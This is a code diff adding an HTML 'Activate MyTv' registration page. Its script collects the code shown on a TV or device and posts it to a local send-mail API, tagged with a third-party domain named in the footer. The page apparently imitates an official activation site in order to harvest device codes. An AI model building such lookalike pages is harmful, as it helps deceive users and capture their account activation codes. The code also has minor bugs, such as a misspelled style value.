@@ -1,0 +1,183 @@
+<html lang="en">
+
+<head></head>
+
+<body data-aos-easing="ease-in-out" data-aos-duration="1000" data-aos-delay="0">
+    <doctype html="">
+
+
+
+
+        <meta charset="utf-8">
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <title>Activate Com MyTv</title>
+
+        <meta content="" name="description">
+        <meta content="mytv, Activate, com MyTv" name="keywords">
+
+        <!-- Google Fonts -->
+        <link
+            href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
+            rel="stylesheet">
+
+        <!-- Vendor CSS Files -->
+        <!-- <link href="assets/vendor/aos/aos.css" rel="stylesheet">
+    <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+    <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+    <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+    <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
+    <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet"> -->
+
+        <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+        <!-- Template Main CSS File -->
+        <link href="assets/css/main.css" rel="stylesheet">
+
+
+
+
+
+
+
+
+        <div style="text-align:center;">
+            <div class="container">
+                <br> <br> <br> <br>
+                <h1 style="color:#3887B4;">REGISTER YOUR COMPATIBLE TV OR DEVICE</h1>
+                <div class="col-lg-12" style="padding:1em; backgrond-color:#999999;">
+                    <form class="php-email-form mt-4" onsubmit="window.location.assign('activatemytv.php');" role="form"
+                        method="post">
+                        <div class="row">
+                            <div class=" col-md-6">
+                                <h4 style=" vertical-align: middle;"><b>Enter the Code Shown on Your Device:</b></h4>
+                                <br><br>
+                            </div>
+                            <div class=" col-md-6">
+
+                                <input type="text" aria-required="true" required="" name="widget-contact-form-name" id="code"
+                                    class="form-control required name" placeholder="WB6RTX">
+                                    <div id="errors"></div>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class=" col-md-6">By continuing, you agree to the <a style="color:#3887B4;" href=""
+                                    target="_blank">Terms of Use.</a></div>
+                            <div class=" col-md-6"><button class="btn" type="submit" id="form-submit"
+                                    style="background-color:#1e1e1e; color:white;">ACTIVATE</button></div>
+                        </div>
+                    </form>
+                    
+                    <div class="row" style="padding:2em; border:1px black;">
+                        <br>
+                        <div class="col-md-4">
+                            <h5>Step 1:</h5>
+                            <p> Open the App on your TV or device.
+                            </p>
+                        </div>
+                        <div class="col-md-4">
+                            <h5>Step 2:</h5>
+                            <p>Select "Register on the website."
+
+                            </p>
+                        </div>
+                        <div class="col-md-4">
+                            <h5>Step 3:</h5>
+                            <p> Your registration code appears on the left of the screen.
+
+                            </p>
+                        </div>
+                        <div class="col-md-4">
+                            <h5>Step 4:</h5>
+                            <p> Activate MyTv by Entering Code on Website screen.
+
+                            </p>
+                        </div>
+                        <div style="padding:1em; background:#c7c7c7;">
+                            <p style="font-size:10px;">We have taken security measures, consistent with international information practices, to protect your personal information. These measures include technical and procedural steps, and measures to protect your personal information from misuse, unauthorized access, disclosure, loss, alteration or destruction. However whilst  <a href="https://www.everydaydigitalsolution.com/">Everydaydigitalsolution.com</a>  has made every effort in the compiling of the contents of this website, it is provided on an “as is” basis without any representation or endorsement being made and without any warranty of any kind. We will not guarantee that the information contained in this website or websites we link to are accurate, comprehensive, verified or complete, and will therefore accept no liability for the accuracy or completeness of the information contained in this website or for any reliance placed by any person on the information..</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+
+        <!-- Vendor JS Files -->
+        <script src="assets/vendor/purecounter/purecounter.js"></script>
+        <script src="assets/vendor/aos/aos.js"></script>
+        <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+        <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
+        <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+        <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
+
+        <!-- Template Main JS File -->
+        <script src="assets/js/main.js"></script>
+
+        <div id="myDIV"></div>
+
+<script>
+    const submitBTN = document.getElementById('form-submit');
+    const code = document.getElementById('code');
+    const errorsDIV = document.getElementById('errors');
+    code.addEventListener('keyup', (event) => {
+        if (!event.target.value || event.target.value === '') {
+            errorsDIV.style.color = "red";
+            errorsDIV.style.padding = "8px";
+            errorsDIV.innerHTML = 'Please enter code'
+        }
+        else {
+            errorsDIV.innerHTML = ''
+        }
+    });
+    submitBTN.addEventListener('click', (e) => {
+        e.preventDefault();
+        console.log(code.value);
+        if (!code || code.value === '') {
+            errorsDIV.style.color = "red";
+            errorsDIV.style.padding = "8px";
+            errorsDIV.innerHTML = 'Please enter code'
+            return;
+        }
+        const payload = {
+            code: code,
+        };
+        const data = new FormData();
+        data.append("json", JSON.stringify(payload));
+        const div = document.createElement('div');
+        div.setAttribute("class", "loading");
+        div.setAttribute("id", "loading");
+        document.getElementById("myDIV").style.display = 'block';
+        document.getElementById("myDIV").appendChild(div);
+        fetch('http://localhost:3000/api/send-mail', {
+            method: "post",
+            body: JSON.stringify({
+                code: code.value,
+                domain: 'https://www.everydaydigitalsolution.com/'
+            }),
+            headers: {
+                'Accept': 'application/json, text/plain, */*',
+                'Content-Type': 'application/json; charset=UTF-8'
+            }
+            //make sure to serialize your JSON body
+
+        }).then(res => res.json()).then(res => {
+            document.getElementById("loading").remove();
+            document.getElementById("myDIV").style.display = 'npne';
+            window.location = "final.html";
+        })
+            .catch(err => {
+                document.getElementById("loading").remove();
+                document.getElementById("myDIV").style.display = 'none';
+                alert(err);
+            })
+    })
+</script>
+
+
+    </doctype>
+
+
+
+</body>
+
+</html>
